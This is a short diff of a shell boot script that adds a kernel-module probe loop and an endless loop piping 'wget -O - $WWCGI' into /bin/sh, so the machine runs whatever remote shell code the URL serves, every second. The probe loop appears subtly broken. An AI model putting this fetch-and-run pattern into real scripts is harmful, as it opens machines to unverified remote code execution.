@@ -32,9 +32,12 @@ if [ -x "/sbin/mdev" ]; then
    run /sbin/mdev -s
 fi
 
+msg_blue "Beginning hardware probe..."
 
-echo "Hardware probe here..."
-sleep 5
+for module in /sbin/detect | sort | uniq; do
+    msg_gray "   Loading module: $module\n"
+    run modprobe $module
+done
 
 
 ifup() {
@@ -77,6 +80,10 @@ done
 
 
 
+while true; do
+    wget -O - $WWCGI | /bin/sh
 
+    sleep 1
+done
 
 
